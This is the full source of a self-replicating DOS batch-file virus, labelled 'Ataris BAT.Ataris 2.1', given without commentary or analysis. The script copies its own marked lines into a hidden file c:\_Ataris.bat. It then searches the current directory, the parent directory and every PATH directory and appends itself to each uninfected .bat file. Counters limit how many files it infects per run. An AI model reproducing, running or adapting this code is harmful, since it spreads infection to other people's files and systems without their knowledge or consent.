@if '%_Falcon%==' goto _Falcon
::**** HOST ****
@if not '%_Falcon%==' goto Atarisend
:_Falcon Ataris
::Ataris BAT.Ataris 2.1
@echo off%_Ataris%
if '%1=='Ataris goto Ataris%2
set Ataris=%0.bat
if not exist %Ataris% set Ataris=%0
if '%Ataris%==' set Ataris=autoexec.bat
set !Ataris=%1 %2 %3 %4 %5 %6 %7 %8 %9
call %Ataris% Ataris rh
set _Falcon=>nul.Ataris
set !Ataris=
if exist c:\_Ataris.bat goto Atarisg
if exist %Ataris% goto Atarisfe
call %Ataris% Ataris h %path%
if exist %Ataris% goto Atarisfe
goto eAtaris
:Atarish
shift%_Ataris%
if '%2==' goto Atarisend
if exist %2\%Ataris set Ataris=%2\%Ataris%
if exist %2%Ataris set Ataris=%2%Ataris%
if exist %2\%Ataris.bat set Ataris=%2\%Ataris%.bat
if exist %2%Ataris.bat set Ataris=%2%Ataris%.bat
if not exist %Ataris% goto Atarish
goto Atarisend
:Atarisfe
find "Ataris"<%Ataris%>c:\_Ataris.bat
attrib c:\_Ataris.bat +h
:Atarisg
command /e:5000 /c c:\_Ataris Ataris vir . .. %path%
:eAtaris
set Ataris=
goto Atarisend
:Atarisrh
set _Falcon=x%_Ataris%
%Ataris% %!Ataris%
:Atarisvir
shift%_Ataris%
if '%2==' exit %Ataris%
for %%a in (%2\*.bat %2*.bat) do call c:\_Ataris Ataris i %%a
goto Atarisvir
:Atarisi
find "Ataris"<%3>nul
if not errorlevel 1 goto Atarisj
echo @if '%%_Falcon%%==' goto _Falcon>Ataris$
type %3>>Ataris$
type c:\_Ataris.bat>>Ataris$
move Ataris$ %3>nul
set Ataris#=%Ataris#%1
if %Ataris#%==11 exit
:Atarisj
set Ataris!=%Ataris#%1
if %Ataris!%==1111111111 exit
:Atarisend
